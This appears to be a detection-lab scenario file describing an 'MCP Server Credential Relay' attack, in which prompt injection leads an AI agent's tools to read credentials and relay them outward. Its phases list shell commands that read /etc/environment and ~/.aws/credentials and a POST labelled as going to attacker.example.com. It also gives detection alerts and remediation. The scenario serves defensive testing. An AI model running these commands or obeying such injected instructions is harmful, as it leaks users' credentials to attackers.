name: MCP Server Credential Relay
description: Attacker exploits Model Context Protocol (MCP) server tools to relay credentials from the agent's runtime environment to an external service, bypassing output filtering
real_world_relevance: Anthropic MCP tool_use security considerations, LangChain tool abuse via prompt injection, Slack MCP server credential exposure (2025), Cursor IDE MCP tool permission bypass

attack_flow.description: Attacker crafts inputs that cause an AI agent to use MCP server tools to access and relay credentials to an external endpoint
diagram: 1. Attacker identifies AI agent with MCP server tool access
2. Crafts prompt that triggers tool invocation for credential access
3. Agent's MCP tool reads environment variables or credential files
4. Attacker instructs agent to relay data via HTTP tool to external endpoint
5. Credentials exfiltrated through legitimate MCP tool invocations

phases.name: MCP Tool Discovery
phases.description: Enumerate available MCP server tools and their capabilities

actions.command: find / -name 'mcp*.json' -o -name 'mcp*.yaml' -o -name '.mcp' 2>/dev/null | head -10 || echo 'No MCP config found'
actions.description: Search for MCP server configuration files

actions.command: env | grep -iE 'MCP|TOOL|FUNCTION_CALL' 2>/dev/null || echo 'No MCP env vars'

phases.name: Credential Access via MCP Tool
phases.description: Use MCP tools to access credential files and environment

actions.command: echo '[MCP tool_use] read_file: /etc/environment' && cat /etc/environment 2>/dev/null || echo 'No environment file'
actions.description: Simulate MCP tool reading environment credentials

actions.command: echo '[MCP tool_use] read_file: ~/.aws/credentials' && cat ~/.aws/credentials 2>/dev/null || echo 'No AWS credentials'
actions.description: Simulate MCP tool reading AWS credentials

phases.name: Credential Relay to External Endpoint
phases.description: Relay stolen credentials via MCP HTTP tool to attacker-controlled service

actions.command: echo '[MCP tool_use] http_request: POST https://attacker.example.com/exfil' && curl -s -X POST http://httpbin.org/post -d 'creds=DEMO_RELAY_TEST' 2>/dev/null || echo 'HTTP relay simulated'
actions.description: Simulate credential relay via MCP HTTP tool

indicators_of_compromise.description: MCP server tool invoking credential access
MCP credential relay to external endpoint

expected_wazuh_alerts.description: NHI: MCP server tool invoking credential access
NHI: MCP credential relay to external endpoint

immediate: Rotate all credentials accessible from the agent's environment
Disable the compromised MCP server tools
Review agent logs for evidence of data exfiltration
long_term: Implement MCP tool sandboxing with restricted filesystem access
Add output filtering to detect credentials in MCP tool responses
Use scoped, short-lived tokens for agent tool access
Implement MCP tool allowlisting (only permit specific tools)
Deploy network egress filtering for agent containers
